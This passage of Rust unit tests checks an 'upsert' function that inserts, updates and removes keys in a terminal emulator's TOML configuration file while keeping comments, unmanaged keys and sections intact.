        let edits = [SettingEdit { section: "", key: "scrollback", value: Some("5000".into()), insert: true }];
        let out = upsert("# hi\nscrollback = 10000\nshell = \"pwsh\"\n", &edits);
        assert!(out.contains("scrollback = 5000"));
        assert!(out.contains("# hi"), "comment preserved");
        assert!(out.contains("shell = \"pwsh\""), "unmanaged key preserved");
        assert_eq!(out.matches("scrollback").count(), 1, "no duplicate line");
    }

    #[test]
    fn upsert_inserts_top_level_before_first_section() {
        let edits = [SettingEdit { section: "", key: "theme", value: Some(toml_string("nord")), insert: true }];
        let out = upsert("[window]\nfont_size = 18\n", &edits);
        assert!(out.find("theme = ").unwrap() < out.find("[window]").unwrap(), "key precedes header");
    }

    #[test]
    fn upsert_inserts_into_existing_section() {
        let edits = [SettingEdit { section: "window", key: "ligatures", value: Some("false".into()), insert: true }];
        let (cfg, warns) = parse(&upsert("[window]\nfont_size = 18\n", &edits));
        assert!(warns.is_empty(), "{warns:?}");
        assert_eq!(cfg.ligatures, Some(false));
        assert_eq!(cfg.font_size, Some(18.0), "existing section key kept");
    }

    #[test]
    fn upsert_creates_missing_section() {
        let edits = [SettingEdit { section: "window", key: "font_size", value: Some("20".into()), insert: true }];
        let (cfg, warns) = parse(&upsert("shell = \"pwsh\"\n", &edits));
        assert!(warns.is_empty(), "{warns:?}");
        assert_eq!(cfg.font_size, Some(20.0));
        assert_eq!(cfg.shell.as_deref(), Some("pwsh"), "top-level key kept");
    }

    #[test]
    fn upsert_without_insert_skips_absent_but_updates_present() {
        let edit = |insert| [SettingEdit { section: "", key: "scrollback", value: Some("10000".into()), insert }];
        assert_eq!(upsert("shell = \"pwsh\"\n", &edit(false)), "shell = \"pwsh\"\n", "absent key left out");
        assert!(upsert("scrollback = 50\n", &edit(false)).contains("scrollback = 10000"), "present updated");
    }

    #[test]
    fn upsert_removes_key_when_value_is_none() {
        let edits = [SettingEdit { section: "", key: "shell", value: None, insert: false }];
        // An existing line is dropped...
        let out = upsert("shell = \"pwsh\"\nscrollback = 50\n", &edits);
        assert!(!out.contains("shell"), "shell line removed: {out:?}");
        assert!(out.contains("scrollback = 50"), "other keys kept");
        // ...and an absent key is a no-op.
        assert_eq!(upsert("scrollback = 50\n", &edits), "scrollback = 50\n");
    }

    #[test]
    fn upsert_round_trips_through_parse() {
        let edits = [
            SettingEdit { section: "", key: "theme", value: Some(toml_string("gruvbox-dark")), insert: true },
            SettingEdit { section: "", key: "cursor_blink", value: Some("true".into()), insert: true },
            SettingEdit { section: "window", key: "font_size", value: Some("16".into()), insert: true },
        ];
        let (cfg, warns) = parse(&upsert("", &edits));
        assert!(warns.is_empty(), "{warns:?}");
        assert_eq!(cfg.theme, preset("gruvbox-dark").unwrap());
        assert_eq!(cfg.cursor_blink, Some(true));
        assert_eq!(cfg.font_size, Some(16.0));
    }
}
